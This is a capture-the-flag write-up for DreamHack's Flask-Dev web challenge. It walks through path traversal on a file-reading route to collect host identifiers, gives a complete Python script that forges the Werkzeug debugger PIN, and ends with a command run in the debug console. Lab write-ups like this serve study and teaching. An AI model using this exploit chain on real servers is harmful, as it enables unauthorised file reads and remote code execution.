# Flask-Dev — DreamHack

> **Room / Challenge:** Flask-Dev (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Flask-Dev (web)
- **Link**: `https://dreamhack.io/wargame/challenges/74`
- **Level:** `4`
- **Date:** `27-11-2025`

---

## Goal

Leveraging debugging mode in production to get the flag.

## My Solution

The `app.py` is short and simple:

```python
#!/usr/bin/python3
from flask import Flask
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

@app.route('/')
def index():
	return 'Hello !'

@app.route('/<path:file>')
def file(file):
	return open(file).read()

app.run(host='0.0.0.0', port=8000, threaded=True, debug=True)
```

The `Dockerfile` tells us that the `/flag` is an executable C script:

```docker
RUN gcc /app/flag.c -o /flag \
    && chmod 111 /flag && rm /app/flag.c
```

Since the app is vulnerable in this route:

```python
@app.route('/<path:file>')
def file(file):
	return open(file).read()
```

We can access resources in the app, we can tried visit http://host8.dreamhack.games:18277/app.py, we will get the `app.py` content. Tried some simple Path Traversal route however I cannot get the flag such as `//flag`, `../../../.././../flag`, ...

Since the debug mode is true, therefore we can get the pin and run code in the Not Found error page. This app is vulnerable related to **Werkzeug debugger vulnerability**.

Get the content that maybe used to create the pin:

```
http://host8.dreamhack.games:18277/../../../../sys/class/net/eth0/address => aa:fc:00:00:2e:01 (MAC ADDRESS)
http://host8.dreamhack.games:18277/../../../../proc/sys/kernel/random/boot_id => e7f4136c-5b21-438f-88d0-08a9a7bab960 (BOOT ID)
http://host8.dreamhack.games:18277/../../../../proc/self/cgroup => 13:pids:/libpod_parent/libpod-b54f13e8f463615c55acd4b41d20bd35b9cab8ab71414d1fcf9e13da6f85922d... (CGROUP ID)
```

Here is the code I used to create possible PIN:

```python
import hashlib
from itertools import chain

mac_address = "aafc00002e01"
mac_int = int(mac_address, 16)

boot_id = "e7f4136c-5b21-438f-88d0-08a9a7bab960"

cgroup_id = "libpod-b54f13e8f463615c55acd4b41d20bd35b9cab8ab71414d1fcf9e13da6f85922d"

etc_machine_id = "c31eea55a29431535ff01de94bdcf5cf"

def get_pin(public_bits, private_bits):
    h = hashlib.md5()
    for bit in chain(public_bits, private_bits):
        if not bit: continue
        if isinstance(bit, str): bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    return rv

probable_public_bits = [
    'dreamhack',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py'
]

# Scenario 1: Boot ID + Cgroup (Standard)
private_bits_1 = [ str(mac_int), boot_id + cgroup_id ]

# Scenario 2: Just Boot ID (If Cgroup parsing failed/ignored)
private_bits_2 = [ str(mac_int), boot_id ]

# Scenario 3: /etc/machine-id + Cgroup (If etc_machine_id exists)
private_bits_3 = [ str(mac_int), (etc_machine_id if etc_machine_id else boot_id) + cgroup_id ]

# Scenario 4: Cgroup Only (Rare, old versions)
private_bits_4 = [ str(mac_int), cgroup_id ]

print(f"PIN 1 (BootID + Cgroup):   {get_pin(probable_public_bits, private_bits_1)}")
print(f"PIN 2 (BootID Only):       {get_pin(probable_public_bits, private_bits_2)}")
if etc_machine_id:
    print(f"PIN 3 (/etc/machine-id):   {get_pin(probable_public_bits, private_bits_3)}")
print(f"PIN 4 (Cgroup Only):       {get_pin(probable_public_bits, private_bits_4)}")
```

Got 4 possible pins:
![Guide image](./screenshots/1.png)
Tried these pin to get access to debug mode, and run code to get the flag:

```python
import os; print(os.popen('/flag').read())
```

![Guide image](./screenshots/2.png)
